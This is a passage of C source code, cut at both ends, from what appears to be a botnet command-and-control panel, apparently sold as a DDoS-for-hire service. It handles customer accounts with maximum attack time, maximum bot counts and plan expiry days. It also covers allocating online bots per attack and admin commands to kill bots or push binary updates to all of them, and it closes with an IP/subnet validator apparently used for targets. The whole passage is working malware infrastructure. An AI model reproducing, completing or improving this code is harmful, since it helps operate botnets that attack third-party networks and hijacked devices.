    snprintf(response, sizeof(response), CYAN "\rMax attack time (seconds): " RESET);
    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
    int timeidx = 0;
    memset(buffer, 0, sizeof(buffer));
    while (1) {
        len = recv(client_socket, buffer + timeidx, sizeof(buffer) - 1 - timeidx, 0);
        if (len <= 0) return;
        int found = 0;
        for (int i = timeidx; i < timeidx + len; i++) {
            if (buffer[i] == '\n' || buffer[i] == '\r') {
                buffer[i] = 0;
                found = 1;
                break;
            }
        }
        timeidx += len;
        if (found) break;
        if (timeidx >= (int)sizeof(buffer) - 1) return;
    }
    while (recv(client_socket, &tmp, 1, MSG_DONTWAIT | MSG_PEEK) > 0) {
        recv(client_socket, &tmp, 1, MSG_DONTWAIT);
    }
    buffer[strcspn(buffer, "\r\n")] = 0;
    if (sscanf(buffer, "%d", &maxtime) != 1 || maxtime <= 0) {
        snprintf(response, sizeof(response), LIGHT_BLUE "Invalid max time value\r\n" RESET);
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        return;
    }
    snprintf(response, sizeof(response), CYAN "\rMax bots: " RESET);
    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
    int botsidx = 0;
    memset(buffer, 0, sizeof(buffer));
    while (1) {
        len = recv(client_socket, buffer + botsidx, sizeof(buffer) - 1 - botsidx, 0);
        if (len <= 0) return;
        int found = 0;
        for (int i = botsidx; i < botsidx + len; i++) {
            if (buffer[i] == '\n' || buffer[i] == '\r') {
                buffer[i] = 0;
                found = 1;
                break;
            }
        }
        botsidx += len;
        if (found) break;
        if (botsidx >= (int)sizeof(buffer) - 1) return;
    }
    while (recv(client_socket, &tmp, 1, MSG_DONTWAIT | MSG_PEEK) > 0) {
        recv(client_socket, &tmp, 1, MSG_DONTWAIT);
    }
    buffer[strcspn(buffer, "\r\n")] = 0;
    if (sscanf(buffer, "%d", &maxbots) != 1 || maxbots <= 0) {
        snprintf(response, sizeof(response), LIGHT_BLUE "Invalid max bots value\r\n" RESET);
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        return;
    }

    /* ---- Plan expiry days ---- */
    snprintf(response, sizeof(response), CYAN "\rPlan days (0 = never expires): " RESET);
    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
    int daysidx = 0;
    memset(buffer, 0, sizeof(buffer));
    while (1) {
        len = recv(client_socket, buffer + daysidx, sizeof(buffer) - 1 - daysidx, 0);
        if (len <= 0) return;
        int found = 0;
        for (int i = daysidx; i < daysidx + len; i++) {
            if (buffer[i] == '\n' || buffer[i] == '\r') { buffer[i] = 0; found = 1; break; }
        }
        daysidx += len;
        if (found) break;
        if (daysidx >= (int)sizeof(buffer) - 1) return;
    }
    while (recv(client_socket, &tmp, 1, MSG_DONTWAIT | MSG_PEEK) > 0)
        recv(client_socket, &tmp, 1, MSG_DONTWAIT);

    buffer[strcspn(buffer, "\r\n")] = 0;
    int plan_days = 0;
    if (sscanf(buffer, "%d", &plan_days) != 1 || plan_days < 0) {
        snprintf(response, sizeof(response), LIGHT_BLUE "Invalid days value\r\n" RESET);
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        return;
    }
    time_t expire_time = (plan_days > 0) ? (time(NULL) + (time_t)plan_days * 86400) : 0;

    /* Persist using save_users() for atomic write (no partial-write corruption).
       Add to in-memory table first, then flush the whole file. */
    if (user_count >= MAX_USERS) {
        snprintf(response, sizeof(response), LIGHT_BLUE "User table full\r\n" RESET);
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        return;
    }

    strncpy(users[user_count].user, newuser, sizeof(users[user_count].user) - 1);
    users[user_count].user[sizeof(users[user_count].user) - 1] = 0;
    strncpy(users[user_count].pass, newpass, sizeof(users[user_count].pass) - 1);
    users[user_count].pass[sizeof(users[user_count].pass) - 1] = 0;
    users[user_count].maxtime     = maxtime;
    users[user_count].maxbots     = maxbots;
    users[user_count].is_admin    = is_admin;
    users[user_count].is_root     = 0;
    users[user_count].is_logged_in = 0;
    users[user_count].expire_time = expire_time;
    user_count++;

    save_users();   /* atomic rename — no partial-write corruption */

    char expiry_disp[64];
    if (expire_time == 0) {
        strncpy(expiry_disp, "Never", sizeof(expiry_disp));
    } else {
        struct tm tm_exp; localtime_r(&expire_time, &tm_exp);
        strftime(expiry_disp, sizeof(expiry_disp), "%Y-%m-%d", &tm_exp);
    }

    snprintf(response, sizeof(response),
        GREEN "User created:\r\n" RESET
        LIGHT_BLUE "  Username:  " RESET "%s\r\n"
        LIGHT_BLUE "  Max time:  " RESET "%d\r\n"
        LIGHT_BLUE "  Max bots:  " RESET "%d\r\n"
        LIGHT_BLUE "  Admin:     " RESET "%s\r\n"
        LIGHT_BLUE "  Expires:   " RESET "%s\r\n",
        newuser, maxtime, maxbots,
        is_admin ? "yes" : "no",
        expiry_disp);
    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
}

/* -----------------------------------------------------------------------
 * maxslots <N>
 *   Sets the global slot count.
 *   Attacks use cons=M to consume M/N of the online bots.
 *   Example: 1000 bots, maxslots=10 → cons=3 → 300 bots for that attack.
 *   Admin and root only.
 * ----------------------------------------------------------------------- */
void handle_maxslots_command(const User *user, const char *command, char *response) {
    if (!user->is_admin) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "Only admins can use maxslots\r\n" RESET);
        return;
    }

    int n = 0;
    if (sscanf(command, "maxslots %d", &n) != 1 || n < 1 || n > 999) {
        pthread_mutex_lock(&g_maxslots_mutex);
        int cur = g_maxslots;
        pthread_mutex_unlock(&g_maxslots_mutex);

        int total = 0;
        pthread_mutex_lock(&bot_mutex);
        for (int i = 0; i < bot_count; i++)
            if (bots[i].is_valid && bots[i].socket > 0) total++;
        pthread_mutex_unlock(&bot_mutex);

        snprintf(response, MAX_COMMAND_LENGTH,
                 LIGHT_BLUE "Usage: maxslots <1-999>\r\n" RESET
                 LIGHT_BLUE "Current: " RESET "%d slots  (~%d bots/slot)\r\n",
                 cur, cur > 0 ? total / cur : total);
        return;
    }

    pthread_mutex_lock(&g_maxslots_mutex);
    g_maxslots = n;
    pthread_mutex_unlock(&g_maxslots_mutex);

    /* Show live per-slot bot count so the operator knows what cons=1..N means */
    int total = 0;
    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < bot_count; i++)
        if (bots[i].is_valid && bots[i].socket > 0) total++;
    pthread_mutex_unlock(&bot_mutex);

    int per_slot = (n > 0 && total > 0) ? (total / n) : 0;

    snprintf(response, MAX_COMMAND_LENGTH,
             GREEN "Max slots → %d\r\n" RESET
             LIGHT_BLUE "  Bots online:  " RESET "%d\r\n"
             LIGHT_BLUE "  Per slot:     " RESET "~%d bots\r\n"
             LIGHT_BLUE "  Range:        " RESET "cons=1 (%d bots) .. cons=%d (%d bots)\r\n",
             n, total, per_slot,
             per_slot, n, total);
}

/* -----------------------------------------------------------------------
 * adddays <username> <N>
 *   Adds N days to a user's plan expiry.
 *   If the plan already expired (or was 0 = lifetime), it resets to now + N.
 *   Root users cannot have their expiry changed (always lifetime).
 *   Only root-level operators can call this.
 * ----------------------------------------------------------------------- */
void handle_adddays_command(const User *user, const char *command, char *response) {
    if (!is_rootuser(user->user)) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "Only root can use adddays\r\n" RESET);
        return;
    }

    char target[50] = {0};
    int  days = 0;
    if (sscanf(command, "adddays %49s %d", target, &days) != 2 || days <= 0) {
        snprintf(response, MAX_COMMAND_LENGTH,
                 LIGHT_BLUE "Usage: adddays <username> <days>\r\n" RESET);
        return;
    }

    int found = -1;
    for (int i = 0; i < user_count; i++) {
        if (strcmp(users[i].user, target) == 0) { found = i; break; }
    }
    if (found < 0) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "User '%s' not found\r\n" RESET, target);
        return;
    }
    if (users[found].is_root) {
        snprintf(response, MAX_COMMAND_LENGTH,
                 YELLOW "Root users have a lifetime plan — no expiry needed\r\n" RESET);
        return;
    }

    time_t now = time(NULL);
    if (users[found].expire_time == 0 || users[found].expire_time < now) {
        /* Expired or was lifetime (0) → start fresh from now */
        users[found].expire_time = now + (time_t)days * 86400;
    } else {
        /* Extend from current expiry */
        users[found].expire_time += (time_t)days * 86400;
    }

    save_users();   /* atomic persist */

    char expiry_buf[32];
    struct tm tm_exp; localtime_r(&users[found].expire_time, &tm_exp);
    strftime(expiry_buf, sizeof(expiry_buf), "%Y-%m-%d %H:%M", &tm_exp);

    long long rem = (long long)users[found].expire_time - (long long)now;
    int rem_days = (int)(rem / 86400);

    snprintf(response, MAX_COMMAND_LENGTH,
             GREEN "Added %d days to %s\r\n" RESET
             LIGHT_BLUE "  New expiry:  " RESET "%s\r\n"
             LIGHT_BLUE "  Days left:   " RESET "%d\r\n",
             days, target, expiry_buf, rem_days);
}

void handle_removeuser_command(const User *user, const char *command, char *response) {
    if (!is_rootuser(user->user)) {
        snprintf(response, MAX_COMMAND_LENGTH, LIGHT_BLUE "Only root user can remove users\r\n" RESET);
        return;
    }    char target[50];
    if (sscanf(command, "!removeuser %49s", target) != 1) {
        snprintf(response, MAX_COMMAND_LENGTH, LIGHT_BLUE "Usage: !removeuser <username>\r\n" RESET);
        return;
    }

    int found = 0;
    for (int i = 0; i < user_count; i++) {
        if (strcmp(users[i].user, target) == 0) {
            found = 1;
            break;
        }
    }
    if (!found) {
        snprintf(response, MAX_COMMAND_LENGTH, LIGHT_BLUE "User does not exist\r\n" RESET);
        return;
    }
    if (is_rootuser(target)) {
        snprintf(response, MAX_COMMAND_LENGTH, LIGHT_BLUE "Cannot remove root user\r\n" RESET);
        return;
    }

    FILE *f = fopen("database/logins.txt", "r");
    FILE *temp = fopen("database/logins.tmp", "w");
    if (!f || !temp) {
        snprintf(response, MAX_COMMAND_LENGTH, LIGHT_BLUE "Failed to remove user\r\n" RESET);
        if (f) fclose(f);
        if (temp) fclose(temp);
        return;
    }

    char line[256];
    int removed = 0;
    while (fgets(line, sizeof(line), f)) {
        char current[50];
        if (sscanf(line, "%49s", current) == 1) {
            if (strcmp(current, target) != 0) {
                fputs(line, temp);
            } else {
                removed = 1;
            }
        }
    }

    fclose(f);
    fclose(temp);

    if (removed) {
        /* Bug was: remove("logins.txt") then rename("logins.txt","logins.txt") — deleted the DB.
           Correct atomic replace: rename tmp over the original. */
        if (rename("database/logins.tmp", "database/logins.txt") != 0) {
            snprintf(response, MAX_COMMAND_LENGTH, LIGHT_BLUE "Failed to save user database\r\n" RESET);
            return;
        }
        load_users();
        snprintf(response, MAX_COMMAND_LENGTH, LIGHT_BLUE "User %s removed\r\n" RESET, target);
    } else {
        remove("database/logins.tmp");
        snprintf(response, MAX_COMMAND_LENGTH, LIGHT_BLUE "User not found\r\n" RESET);
    }
}

void handle_kickuser_command(const User *user, const char *command, char *response) {
    /* Was using static vars — shared across all concurrent CNC sessions → race condition. Fixed. */
    char target[50] = {0};
    int allow_non_admin = 0;
    int found = 0;

    if (!user->is_admin) {
        FILE *sf = fopen("options/settings.txt", "r");
        if (sf) {
            char line[128];
            while (fgets(line, sizeof(line), sf)) {
                if (strncmp(line, "globalstopall:", 13) == 0 && strstr(line, "yes")) {
                    allow_non_admin = 1;
                    break;
                }
            }
            fclose(sf);
        }
        if (!allow_non_admin) {
            snprintf(response, MAX_COMMAND_LENGTH, LIGHT_BLUE "Error: admin or globalstopall required to kick users\r\n" RESET);
            return;
        }
    }

    if (sscanf(command, "kickuser %49s", target) != 1) {
        snprintf(response, MAX_COMMAND_LENGTH, LIGHT_BLUE "Usage: kickuser <username>\r\n" RESET);
        return;
    }

    for (int i = 0; i < user_count; i++) {
        if (strcmp(users[i].user, target) == 0) {
            if (!users[i].is_logged_in) {
                snprintf(response, MAX_COMMAND_LENGTH, LIGHT_BLUE "User not connected\r\n" RESET);
                return;
            }
            /* Close only the socket that belongs to this user, not all sockets. */
            for (int j = 0; j < MAX_USERS; j++) {
                if (j == i && user_sockets[j] > 0) {
                    shutdown(user_sockets[j], SHUT_RDWR);
                    close(user_sockets[j]);
                    user_sockets[j] = 0;
                }
            }
            users[i].is_logged_in = 0;
            found = 1;
            break;
        }
    }

    if (found) {
        snprintf(response, MAX_COMMAND_LENGTH, LIGHT_BLUE "Kicked user %s\r\n" RESET, target);
    } else {
        snprintf(response, MAX_COMMAND_LENGTH, LIGHT_BLUE "User not found\r\n" RESET);
    }
}

void handle_admin_command(const User *user, char *response) {
    if (!user->is_admin) {
        snprintf(response, MAX_COMMAND_LENGTH, LIGHT_BLUE "Only admins can use admin command\r\n" RESET);
        return;
    }
    pthread_mutex_lock(&g_maxslots_mutex);
    int cur_slots = g_maxslots;
    pthread_mutex_unlock(&g_maxslots_mutex);

    snprintf(response, MAX_COMMAND_LENGTH,
             "\r\n"
             LIGHT_BLUE " [" RESET "Admin Commands" LIGHT_BLUE "]\r\n"
             LIGHT_BLUE " ║ " RESET "adduser            " GRAY "- " RESET "add a new user\r\n"
             LIGHT_BLUE " ║ " RESET "removeuser <u>     " GRAY "- " RESET "remove a user\r\n"
             LIGHT_BLUE " ║ " RESET "adddays <u> <N>    " GRAY "- " RESET "add N days to user plan (root only)\r\n"
             LIGHT_BLUE " ║ " RESET "maxslots <N>       " GRAY "- " RESET "set global slot count (now: %d)\r\n"
             LIGHT_BLUE " ║ " RESET "kill               " GRAY "- " RESET "self-destruct on bots\r\n"
             LIGHT_BLUE " ║ " RESET "kickuser <u>       " GRAY "- " RESET "kick a connected user\r\n"
             LIGHT_BLUE " ║ " RESET "users list         " GRAY "- " RESET "show all users in a table\r\n"
             LIGHT_BLUE " ║ " RESET "user <name>        " GRAY "- " RESET "show detailed info for a user\r\n"
             LIGHT_BLUE " ║ " RESET "update             " GRAY "- " RESET "push binary update to all bots\r\n"
             "\r\n" RESET,
             cur_slots);
}

void handle_ping_command(char *response) {
    int valid_bots = 0;
    pthread_mutex_lock(&bot_mutex);
    int count = bot_count < MAX_BOTS ? bot_count : MAX_BOTS;
    for (int i = 0; i < count; i++) {
        if (bots[i].is_valid && bots[i].socket > 0) valid_bots++;
    }
    pthread_mutex_unlock(&bot_mutex);
    /* Was computing valid_bots but never writing to response → always sent empty string. Fixed. */
    snprintf(response, MAX_COMMAND_LENGTH, YELLOW "Bots online: " RESET "%d\r\n", valid_bots);
}




int validate_ip_or_subnet(const char *ip) {
    char buf[32];
    strncpy(buf, ip, sizeof(buf)-1);
    buf[sizeof(buf)-1] = 0;
    char *slash = strchr(buf, '/');
    if (slash) {
        *slash = 0;
        int cidr = atoi(slash+1);
        if (cidr < 1 || cidr > 32) return 0;
    }
    struct in_addr addr;
    return inet_aton(buf, &addr);
}